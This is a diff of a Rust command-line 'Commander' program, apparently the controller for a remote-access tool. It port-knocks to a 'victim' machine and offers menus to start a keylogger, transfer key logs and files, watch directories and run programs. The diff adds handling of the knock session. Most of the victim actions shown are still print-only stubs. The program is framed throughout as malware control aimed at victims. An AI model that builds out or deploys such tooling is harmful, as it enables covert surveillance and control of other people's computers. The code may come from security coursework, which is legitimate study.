@@ -1,10 +1,11 @@
 use std::io::{self, Write};
 use std::path::PathBuf;
+
 mod port_knkr;
 mod pcap_capture;
 
+use port_knkr::KnockSession;
 use pcap_capture::PcapHandle;
-
 
 #[derive(Debug, PartialEq)]
 enum SessionState {
@@ -14,12 +15,14 @@ enum SessionState {
 
 struct Commander {
     state: SessionState,
+    knock_session: Option<KnockSession>,
 }
 
 impl Commander {
     fn new() -> Self {
         Self {
             state: SessionState::Disconnected,
+            knock_session: None,
         }
     }
 
@@ -32,10 +35,6 @@ impl Commander {
         }
     }
 
-    /* =========================
-     * MENUS
-     * ========================= */
-
     fn disconnected_menu(&mut self) {
         println!("\n=== Commander ===");
         println!("1) Initiate session (port knock)");
@@ -44,7 +43,6 @@ impl Commander {
         match prompt("Select option: ").as_str() {
             "1" => {
                 self.port_knock();
-                self.state = SessionState::Connected;
             }
             "0" => {
                 println!("Exiting commander.");
@@ -82,13 +80,11 @@ impl Commander {
         }
     }
 
-    /* =========================
-     * SESSION
-     * ========================= */
     fn port_knock(&mut self) {
         match port_knkr::port_knock() {
-            Ok(_) => {
+            Ok(session) => {
                 println!("[✓] Session established");
+                self.knock_session = Some(session);
                 self.state = SessionState::Connected;
             }
             Err(e) => println!("[!] Port knock failed: {}", e),
@@ -97,16 +93,18 @@ impl Commander {
 
     fn disconnect(&mut self) {
         println!("[*] Disconnecting from victim...");
+
+        if let Some(session) = &self.knock_session {
+            session.stop();
+        }
+
+        self.knock_session = None;
         self.state = SessionState::Disconnected;
     }
 
     fn uninstall(&self) {
         println!("[*] Sending uninstall command to victim...");
     }
-
-    /* =========================
-     * KEYLOGGER
-     * ========================= */
 
     fn start_keylogger(&self) {
         println!("[*] Starting keylogger on victim...");
@@ -119,10 +117,6 @@ impl Commander {
     fn transfer_keylog(&self) {
         println!("[*] Transferring key log file from victim...");
     }
-
-    /* =========================
-     * FILE OPS
-     * ========================= */
 
     fn transfer_file_to_victim(&self) {
         let path = prompt("Enter local file path: ");
@@ -145,10 +139,6 @@ impl Commander {
         println!("[*] Watching directory {:?} on victim...", path);
     }
 
-    /* =========================
-     * EXECUTION
-     * ========================= */
-
     fn run_program(&self) {
         let program = prompt("Enter program to run: ");
         println!("[*] Running program on victim: {}", program);
@@ -157,10 +147,6 @@ impl Commander {
         println!("----------------------");
     }
 }
-
-/* =========================
- * UTIL
- * ========================= */
 
 fn prompt(msg: &str) -> String {
     print!("{}", msg);
@@ -174,7 +160,6 @@ fn prompt(msg: &str) -> String {
 fn main() {
     let _pcap = PcapHandle::start("lo");
 
-    // Ctrl+C = immediate exit
     ctrlc::set_handler(|| {
         println!("\n[!] Ctrl+C received — exiting.");
         std::process::exit(0);
